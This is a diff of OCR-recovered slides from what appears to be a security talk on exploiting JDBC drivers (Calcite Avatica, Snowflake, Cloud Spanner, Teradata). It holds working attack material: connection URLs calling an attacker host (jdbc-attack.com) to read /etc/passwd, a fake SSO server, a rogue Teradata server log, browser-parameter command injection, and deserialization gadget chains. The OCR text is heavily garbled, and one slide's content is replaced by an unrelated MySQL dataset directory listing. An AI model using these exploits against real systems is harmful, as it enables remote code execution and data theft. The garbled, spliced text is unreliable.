+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Apache Calcite Avatica Remote Code Execution via Unchecked Class
@@ -1120,7 +989,6 @@ ObjectMapper mapper new ObjectMapper () ;
 JsonNode jnode = mapper.readTree(reader) ;
 String result = jnode.path("result") .asText() ;
 Runtime. getRuntime() .exec(result) ;
-1
 J
 ```
 
@@ -1128,7 +996,8 @@ J
 
 Apache Calcite Avatica Remote Code Execution via Unchecked Class
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Structure
@@ -1139,23 +1008,12 @@ import java.sql.SQLException;
 public class AvaticaDemo{
 public static void main(String[] args) throws SQLException {
 DriverManager.registerDriver(new org.apache.calcite.avatica.remote.Driver());
-DriverManager.getConnection( url: "jdbc: avatica:remote:url= DEPT =
-"6 AvaticaDemo »
-\\ Actuator
-ae
 /Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/bin/java ...
 {"result":"open -a calculator"}
 Exception in thread "main" java.lang.RuntimeException Create breakpoint : Failed to construct AvaticaHttpClient implementation com.example.avaticademo.CustomHttpCLlient
 6
->»
 >
-ip
-5
 Run:
-> Console
-de |e
-a ¥
-| er
 = at
 at
 at
@@ -1181,7 +1039,6 @@ calcite.
 calcite.
 calcite.
 calcite.
--calcite.
 calcite.
 calcite.
 avatica.
@@ -1194,19 +1051,8 @@ avatica.
 avatica
 avatica.
 avatica.
-remote.AvaticaHttpClientFactoryImpl.instantiateClient (AvaticaHttoClientFactoryImpl. java: 147)
-remote.AvaticaHttpClientFactoryImpl. getClient (AvaticahttpClientFactoryImpl. java: 63)
-remote.Driver.getHttpClient (Driver. java: 160)
-remote.Driver.createService(Driver., java: 123)
-remote .Driver.createMeta(Driver. java:97)
 AvaticaConnection.<init>(AvaticaConnection. java:121)
-AvaticaJdbc41Factory$AvaticaJdbc41Connection.<init>(Avaticajdbe41Factory. java: 109)
--AvaticaJdbe41Factory.newConnection(AvaticaJdbc41Factory. java: 65)
 UnregisteredDriver.connect(UnregisteredDriver. java:138)
-remote .Driver.connect (Driver. java:165)
-java.sql.DriverManager . getConnection(DriverManager. java: 664)
-aseqried ((@
-SUONEOWNON
 ```
 
 ## Slide 49
@@ -1237,15 +1083,13 @@ Try to find a gadget in the real-world scenario
 
 • sun.security.provider.PolicyFile
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Apache Calcite Avatica SSRF via Unchecked Class
-* sun.security.provider.PolicyFile
 PolicyFile java.security.Policy {
 PolicyFile(URL url)
-url url;
-initcurl);
 ```
 
 ## Slide 52
@@ -1254,7 +1098,8 @@ initcurl);
 
 • Sensitive Information Leakage in JDBC Connecting Exception
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Apache Calcite Avatica SSRF via Arbitrary Class
@@ -1264,24 +1109,15 @@ Apache Calcite Avatica SSRF via Arbitrary Class
 DriverNanager.registerDriver(new org.apache.calcite.avatica.remote.Driver());
 DriverManager .getConnection( url: "jdbc:avatica:remote:url=https: //jdbc-attack, com?file=/etc/passwd;httpclient impl=sun.security.provider.PolicyFile") ;
 =) com.example.avaticademo.AvaticaDemo =
-¢ /Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/bin/java ...
-L java.security.policy: error parsing https: //jdbc-attack. com?file=/etc/passwd:
 line 1: expected [;], found [root:x:0:9:root:/root:/bin/bash
-a ]
 a Exception in thread "main" java.lang.RuntimeException Create breakpoint : Failed to construct AvaticaHttpClient implementation sun.security.provider.PolicyFile
-at org.apache.calcite.avatica.remote.AvaticaHttpClientFactorylImpl. instantiateClient (AvaticaHttpClientFactoryImpl. java:147)
-at org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl.getClient (AvaticaHttpClientFactoryI mpl, java: 63)
 at org.apache.calcite.avatica.remote.Driver.getHttpClient (Driver. java:160)
 at org.apache.calcite.avatica.remote.Driver.createService(Driver. java:123)
-at org.apache.calcite.avatica.remote.Driver.createMeta(Driver. java: 97)
 at org.apache.calcite.avatica.AvaticaConnection.<init>(Avatic nonection. java:121)
-a qi
 at org.apache.calcite.avatica.AvaticaJdbc41Factory$AvaticaJdbc41Connection. <init>(AvaticaJdbc41Factory. java:109)
 at org.apache.calcite.avatica.AvaticaJdbe41Factory .newConnection(AvaticaJdbc41Factory.java:65)
-at org.apache.calcite.avatica.UnregisteredDriver.connect (UnregisteredDriver. java:138)
 at org.apache.calcite.avatica.remote.Driver.connect (Driver. java:165)
 at java.sql.DriverManager .getConnection(DriverManager. java: 664)
-at java.sql.DriverManager .getConnection(DriverManager. java: 270)
 at com.example.avaticademo.AvaticaDemo.main(AvaticaDemo. java:14)
 Caused by: java.lLang.ClassCastException Create breakpoint : Cannot cast sun.security.provider.PolicyFile to org.apache.calcite.avatica.remote.AvaticaHttpClient
 at java.lang.Class.cast (Class. java:3369)
@@ -1317,7 +1153,8 @@ JDBC Attack Protection
 
 Snowflake Remote Code Execution via SSO Flow Response
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Snowflake Remote Code Execution via SSO Flow Response
@@ -1326,7 +1163,6 @@ Snowflake Remote Code Execution via SSO Flow Response
 3 try
 4
 5 if (java.awt.Desktop.isDesktopSupported () )
-) URI uri w URI (ssouUrl) ;
 7 java.awt.Desktop. getDesktop() .browse(ur7) ;
 8 }
 9 Runtime runtime = Runtime. getRuntime() ;
@@ -1348,7 +1184,8 @@ Snowflake Remote Code Execution via SSO Flow Response
 
 **Fake Server**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 from flask import Flask, jsonify, request
@@ -1383,25 +1220,17 @@ app.run('0.0.0.0', debug=True, port=443, ssl_context=('/root/ssl/jdbc-attack.com
 
 Snowflake Remote Code Execution via SSO Flow Response
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-a qi
 Snowflake Remote Code Execution via SSO Flow Response
 java.sql.DriverManager
-SnowfLakeDemo
 main(String Exception
 DriverManager .registerDriver com. snowflake.client. jdbc. SnowflakeDriver
 DriverManager .getConnection("jdbc: snowflake: //jdbc-attack.com/?user=admin&password=123456&db=sdb&authenticator=externalbrowser"
 https://safe.govfz.com:
-oa
-S
 w
-https: //safe.govfz.com:443
-https: //safe.govfz.com:4
-S
-on
-https: //safe.govfz.com: 443
 https://safe.govfz.com:443
 Initiating login request with your identity provider. A browser window should have opened for you to complete the login. If you can't see it, check existing browser windows, or your OS settings. Press CTRL+C to abort and try
 ```
@@ -1442,7 +1271,8 @@ Initiating login request with your identity provider. A browser window should ha
 
 **Response JSON Format**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Google Cloud Spanner JDBC Driver Full Read SSRF
@@ -1460,26 +1290,22 @@ Google Cloud Spanner JDBC Driver Full Read SSRF
 wi
 "token_info_url":
 Response JSON Format
-"Client_id":"client_id",
 "
 "client_secret":"client_secret",
-"quota_project_id": "test",
-"workforce_pool_user_project": "test"
 ```
 
 ## Slide 62
 
 Google Cloud Spanner JDBC Driver Full Read SSRF
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Google Cloud Spanner JDBC Driver Full Read SSRF
 if (awsCredentialSource.url == null awsCredentialSource.url.isEmpty()) {
-throw new IOException (
 "Unable to determine the AWS IAM role name.
 t "url field.");
-a
 J
 The credential source does not contain the"
 String roleName = retrieveResource(awsCredentialSource.url, "IAM role", metadataRequestHeaders) ;
@@ -1488,38 +1314,29 @@ retrieveResource (
 awsCredentialSource.url + "/" + roleName,
 "credentials", metadataRequestHeaders) ;
 JsonParser parser OAuth2Uti ls. JSON_FACTORY.createJsonParser (awsCredentials) ;
-GenericJson genericJson = parser.parseAndC lose (GenericJson.class) ;
 ```
 
 ## Slide 63
 
 Google Cloud Spanner JDBC Driver Full Read SSRF
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 49/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Google Cloud Spanner JDBC Driver Full Read SSRF
-DriverManager.registerDriver (new com. google.cloud.spanner.jdbc.JdbcDriver ()) ;
 Connection conn =
-DriverManager.getConnection("jdbc:cloudspanner: /projects/pjm/instances/test/databases/test;encodedCredentials=ewogICJ0exXBlLIjogl
-mV4dGVybmFsx2FjY291bnQi LAoglCIhdWRpZW5j ZST6ICIOZXNOLTiwkKICAic3ViamVjdF90b2t Lb L9OeXBLIjogInRlc3Qi1LAogICI0b2t Lb L9Lcmwi07 Ai aHROCHM6
-Ly9zdHMuZ29vZ2x LYXBpcy5j b20vdG9rZw47 LAogICIj cmVkZW50aWF SX 3NvdX Jj ZSI6THSKICAgICI LbnZpcm9ubWVudF9pZCI61CIhd3MxliwkICAgiCJyZwdpb25
-hbF93 cmVkX3Z LemLmaWNhdG Lvb L9 Lemwi07 Ai YW55dGhpbmci LAogICAgInJlZ2lvblL91cmwi07A7i aHROCHM6Ly9qZGIj LWFOdGF I ay5j b20vP2ZpbGUIL2VOY y9wy X
-Nzd2Q7 LAogICAgInVybCI6ICJodHRwczovL2pkYmMty XROYWNrLmNvbS8_ZmLsSZTOVZXRJL3Bhc3N3ZCIKICB9LAogICIOb2t Lb L9pbmZvxX3VybCléTCIhbnloOaG luz
-yIsCiAgimNsawVudF9pZCI61CIjbGLLbnRfawQiLAogICJjbGLlbnkR fc2Vj cmVOljogImNsaWVudF9zZZWNyZXQi LAogICIxdWw90YV9wcem9qZWNOX2 LkIjoginRlc3Qi
-LAogICJ3b3IrZm9yY2V FcG9VbF91C2VyX3Byb2pLY3Q1071A1dGVzdCIKfQ==") ;
-conn.createStatement () ;
 ```
 
 ## Slide 64
 
 Google Cloud Spanner JDBC Driver Full Read SSRF
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 44
-System.out.printin("Cr
 String credentialsJson
 // note: the project/i
 Google Cloud Spanner JDBC Driver Full Read SSRF
@@ -1528,33 +1345,25 @@ Encoded = Baseé4.getUrlEncoder() .encodeToString(credentialsJson.getBytes() );
 nstanc
 database here are never used before the exploit runs
 String url = String.format("jdbc:cloudspanner: /projects/Learning-pjm/instances/test/databases/test;encodedCredentials=%s", credentialsJsonEncaded) ;
-System.out.printf ("Con
 // Register Connection
 struct JDBC Connection URL: %s%n", url);
-DriverManager .registerDriver(new com.google.cloud.spanner. jdbc. JdbcDriver());
 // Get Connection
 Connection connection
 // Establish the conne
-connection. createState
 ™ CloudSpannerFullSSRFPOC
-at com.googte.autn
 at com.google.auth.cauth2.
 at com.google.auth.oauth2.
 at com.google.auth.oauth2.
 at com.google.auth.cauth2.
 3 more
-Oautnz.A
 Caused by: com.google.api.client.http.HttpResponseException: 500 INTERNAL SERVER ERROR
 = DriverManager.getConnection(url) ;
 ction
 ment();
-wstredentials.getaAwssecuritylredentials(Awstredentials. jav
 AwsCredentials.retrieveSubjectToken(AwsCredentials. java:162)
 AwsCredentials.refreshAccessToken(AwsCredentials. java:142)
-OAUth2Credentials$1.callCOAuth2Credentials. java: 257)
 OAuth2Credentials$1.call(@Auth2Credentials.java:254) <1 internal Line>
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.61 Transitional//EN
-<html>
 <head>
 <title>NotADirectoryError:
 >
@@ -1574,7 +1383,8 @@ OAuth2Credentials$1.call(@Auth2Credentials.java:254) <1 internal Line>
 
 ## Slide 66
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 1 var6 = var6.replaceALL("PLACEHOLDER", varl2 + "?response_type=code" + "&client_id=" +4
@@ -1628,45 +1438,52 @@ OAuth2Credentials$1.call(@Auth2Credentials.java:254) <1 internal Line>
 
 Teradata JDBC Driver Remote Code Execution via SSO Command Injection
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 69/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-Run:
-Teradata JOBC Driver Remote Code Execution via SSO Command Injection
-import java.sql.DriverNanager;
-import java.sql.SQLException;
-public class TeradataDemo {
-public sta
-DriverManager.registerDriver(new com.teradata. jdbc. TeraDriver());
-tic v
-oid main(String[] args) thro
-(()
-x pyn3rd@acBookPro JEVEE python3 -u rogue_teradata_server.py -p 10250 -u ‘https://jdbc—attack.com/teradata'
-04/14/2023 11:40:38 AM [+]Connecting from IP: 127.0.0.1, Port: 54400
-04/14/2023 11:40:38 AM [+]Data received: b'\x03\x01\n\x00\x00\ x07\ x00\x00\x00C\ x00\ xO0\ x00\x00\x00\x00\x00\ x00\ x00\ x00\ x00\x00\x00\x00\xO
-\x00\xfF\xO0\ x00\ x00\ x00\ x00\x00\x00\x00\ x00\ x00\ x00\ x00\ x00\x00\x00\ xa6\x00C\x00\x00\x00\ xO1\xO0\ x02\ xO0\x04\x11\x14\x00\xOC\ x00\x01\x00
-ws SQLException { x@1\x01\x00\x03\x00\x90\x00\ x05\ x00\ x00\ x00\t\x00\x01\x01\ xO0\ xOb\ xO0\ x01\ x01\x00\x0e\x00\ x00\xG0\ xOF\ x00\x00'
-04/14/2023 11:40:38 AM [+]Data sending: b‘'\x03\x02\n\x00\x00\x07\x00\x00\x03\xa3\x00\x00\x00\x00\x00\x00\x00\x00\ x00\ x00\x00\x00\x00\x00\
-00\x05\xff\x00\ xO00\ x00\ x00\x00\x00\x00\x00\x00\ x00\ x00\x00\x00\x00\x00+\xO02N\ x00\ x00\ x03\ xe8\x00\x00\x03\xe8\ xOOx\x00\xO1w\xf f\x00\x00\x0
-DriverManager.getConnection( url: "jdbc:teradata://127.0.0.1/DBS_PORT=10250, LOGMECH=BROWSER, BROWSER='open -a calcuLlator' , TYPE=DEFAULT , COP=OFF , TMODE=TERA, LOG=DEBUG") ;
-a
-eee
-* 2023-04-14.11:41:37.530 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_| =rce
-2023-04-14.11:41:37.530 TERAJDBC4 DEBUG [main] com.teradata. jdbc. jdk6é.JDK6_SQL_ Wf 8 9 | ooo ffs. = In = ial nid-confi ion
-v 2023-04-14.11:41:37.561 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_ socketFactory: sHTTPSProtocol=TLSv1.2
-> 2023-04-14.11:41:37.562 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_ 4 5 6 FD essary sm_socketFactory.getDefauLtCipherSuites=[TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA2
-=f 2023-04-14.11:41:38.098 TERAIDBC4 TIMING [main] com.teradata. jdbc. jdk6.JDK6_SQl y httos://jdbe-attack. com/teradata/.well-known/openid-configuration took 567 ms and completed
-mm 2023-04-14.11:41:38.098 TERAJDBC4 TIMING [main] com.teradata.jdbc.jdk6.JDK6_SQL 1 9) 3 ee HttpServer with Browser Authentication timeout 186000 ms and browser tab timeout 5060 ms
-i 2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbe.jdk6é.JDK6_SQL_ authorization_endpoint": "foo", "token_endpoint": "bar" }
-2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [Thread-4] com.teradata.jdbc.jdk6.JDK6_ fe) arver Listening on port 54470
-2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL _ r= | =
-2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_Connection@16ec5519 sTokenURL=bar 3
-2023-04-14.11:41:38.101 TERAIJDBC4 DEBUG [main] com.teradata. jdbc. jdk6é.JDK6_SQL_Connection@16ec5519 sCodeVerifier=I 5WVBKwIQdjFEqKv4a0zwD2V0tO3mZbWjugnKigLXRM Zl
-2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbe.jdké.JDK6_SQL_Connection@16ec5519 sCodeChallLenge=JAnKkqTFPzdb4msp1j glLHDBTouI1BaG1LtHNFevtqJ9Y a
-2023-04-14.11:41:38.101 TERAIJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_Connection@16ec5519 sRedirectURL=http: //localhost:54470/openid-callback -
-2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata. jdbc. jdk6é.JDK6_SQL_Connection@16ec5519 sOIDCScope=openid =
-2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_Connection@16ec5519 (before PLACEHOLDER swap) sBrowser=open -a calculator S
-2023-04-14.11:41:38.102 TERAJDBC4 TIMING [main] com.teradata.jdbc.jdk6é.JDK6é_SQL_Connection@16ec5519 Launching browser open -a calculator 3
+The Dataset
+
+← → C  ⚠ Not Secure | ghtorrent-downloads.ewi.tudelft.nl/mysql/
+
+Index of /mysql/
+
+../
+mysql-2013-10-12.sql.gz                10-Dec-2015 20:33          4522065160
+mysql-2014-01-02.sql.gz                10-Dec-2015 21:19          5921235276
+mysql-2014-04-02.sql.gz                10-Dec-2015 22:13          7354431193
+mysql-2014-08-18.sql.gz                10-Dec-2015 23:43         12043734230
+mysql-2014-11-10.sql.gz                11-Dec-2015 01:34         15118378692
+mysql-2015-01-04.sql.gz                11-Dec-2015 03:42         17389100969
+mysql-2015-04-01.sql.gz                11-Dec-2015 06:56         26293878411
+mysql-2015-06-18.sql.gz                11-Dec-2015 11:18         35102522985
+mysql-2015-08-07.sql.gz                11-Dec-2015 15:17         33069692808
+mysql-2015-09-25.tar.gz                11-Dec-2015 20:02         33841191143
+mysql-2016-01-08.tar.gz                08-Jan-2016 21:57         35591472888
+mysql-2016-01-16.tar.gz                16-Jan-2016 08:17         35838991852
+mysql-2016-02-01.tar.gz                01-Feb-2016 11:38         36667951779
+mysql-2016-02-16.tar.gz                21-Feb-2016 23:45         37302751172
+mysql-2016-03-01.tar.gz                01-Mar-2016 11:57         37988648250
+mysql-2016-03-16.tar.gz                16-Mar-2016 10:42         38707567798
+mysql-2016-04-19.tar.gz                19-Apr-2016 17:46         40105071925
+mysql-2016-05-04.tar.gz                05-May-2016 02:35         40494259095
+mysql-2016-06-01.tar.gz                01-Jun-2016 11:50         41787169343
+mysql-2016-06-16.tar.gz                16-Jun-2016 11:20         42423227238
+mysql-2016-07-19.tar.gz                23-Jul-2016 09:24         43325816626
+mysql-2016-09-05.tar.gz                05-Sep-2016 23:18         45284829230
+mysql-2017-01-19.tar.gz                20-Jan-2017 04:22         51960147283
+mysql-2017-02-01.tar.gz                01-Feb-2017 12:42         52582882424
+mysql-2017-03-01.tar.gz                01-Mar-2017 14:38         52916505432
+mysql-2017-04-01.tar.gz                01-Apr-2017 14:13         56115975886
+mysql-2017-05-01.tar.gz                01-May-2017 14:40         57721654657
+mysql-2017-06-01.tar.gz                01-Jun-2017 15:02         59315227769
+mysql-2017-07-01.tar.gz                01-Jul-2017 15:05         60948681616
+mysql-2017-09-01.tar.gz                01-Sep-2017 15:53         64258782505
+mysql-2017-10-01.tar.gz                01-Oct-2017 15:57         65448079781
+mysql-2017-12-01.tar.gz                01-Dec-2017 16:49         69797297007
+mysql-2018-01-01.tar.gz                01-Jan-2018 16:52         71446490168
+mysql-2018-02-01.tar.gz                01-Feb-2018 20:09         73273914729
+mysql-2018-03-01.tar.gz                01-Mar-2018 19:13         74476124928
 ```
 
 ## Slide 71
@@ -1684,7 +1501,8 @@ JNDI Deserialization
 
 **CommonsBeantils Gadget**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 public class CommonsBeanutilsl implements ObjectPayload<Object> {
@@ -1696,11 +1514,9 @@ final BeanComparator comparator = new BeanComparator("lLowestSetBit") ;
 final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator) ;
 // stub data for replacement Later
 queue.add(new BigInteger ("1") ) ;
-queue. add(new BigInteger("1"));
 // switch method called by comparator
 Ref lections.setFieldValue(comparator, "property", "outputProperties") ;
 // switch contents of queue
-final Object] queueArray = (Objectl]) Reflections. getFieldValue(queue, "queue") ;
 queueArray| 0] = templates;
 queueArray|1] = templates;
 return queue;
@@ -1720,19 +1536,17 @@ return queue;
 
 Bypass high version Java reflection restriction via Teradata JDBC Driver
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Bypass high version Java reflection restriction via Teradata JDBC Driver
 public class TeraDataSource extends TeraDataSourceBase implements DataSource {
 public TeraDataSource() {
-$
 public Connection getConnection() throws SQLException {
 return this.createNewConnection(this.user, this.password) ;
-$
 public Connection getConnection(String varl, String var2) throws SQLException {
 return this.createNewConnection(varl, var2);
-au
 J
 ```
 
@@ -1740,7 +1554,8 @@ J
 
 **Getter and Setter**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 public class TeraDataSourceBase implements Referenceable, Serializable {
@@ -1751,7 +1566,6 @@ public void setDSName(String varl) {
 this.DSName = varl;
 public String getBROWSER() {
 return this.m_sBrowser;
-}
 public void setBROWSER(String varl) {
 this.m_sBrowser = varl;
 public void setLOGMECH(String varl) {
@@ -1764,7 +1578,8 @@ return this.LogMech;
 
 **TeraDataSource Gadget**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 public class TeraDataSourcel implements ObjectPayload<Object> {
@@ -1774,7 +1589,6 @@ TeraDataSource dataSource = new TeraDataSource() ;
 dataSource.setBROWSER (command) ;
 dataSource.setLOGMECH ("BROWSER") ;
 dataSource.setDSName("127.0.0.1");
-dataSource.setDbsPort ("10250") ;
 // mock method name until armed
 final BeanComparator comparator = new BeanComparator("LlLowestSetBit") ;
 // create queue with numbers and basic comparator
